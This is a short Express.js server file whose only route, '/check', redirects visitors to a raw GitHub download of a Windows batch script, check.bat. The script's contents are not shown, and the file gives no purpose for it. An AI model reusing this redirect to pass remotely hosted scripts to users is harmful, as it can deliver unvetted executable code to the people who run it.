const express = require('express');
const app = express();

app.get('/check', (req, res) => {
    res.redirect('https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.bat');
});

app.listen(process.env.PORT || 3000);
